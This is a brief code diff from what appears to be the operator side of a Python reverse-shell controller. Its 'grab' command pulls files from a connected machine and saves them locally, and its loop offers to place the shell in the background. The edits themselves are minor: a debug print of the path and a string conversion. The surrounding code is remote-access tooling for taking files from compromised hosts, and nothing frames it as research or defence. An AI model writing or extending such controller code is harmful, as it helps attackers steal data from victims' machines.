@@ -60,6 +60,7 @@ $$ |  $$ |\$$$$$$$\ \$$$$$$$ |$$ |  $$ |\$$$$$$$ |$$ |      \$$$$$$$ |
     def transfer(self, conn, command):
         conn.send(command.encode()) # send command to connection
         grab,path = command.split('*')
+        print(path)
         f = open('/mnt/d/'+path,'wb')
         while True:
             bits = conn.recv(1024)
@@ -229,7 +230,7 @@ $$ |  $$ |\$$$$$$$\ \$$$$$$$ |$$ |  $$ |\$$$$$$$ |$$ |      \$$$$$$$ |
             try:
                 cmd = input()
                 if "grab" in str(cmd):
-                    self.transfer(conn, cmd)
+                    self.transfer(conn, str(cmd))
                 elif len(str.encode(cmd)) > 0:
                     if str(cmd) == "background":
                         print("Placing shell in background")
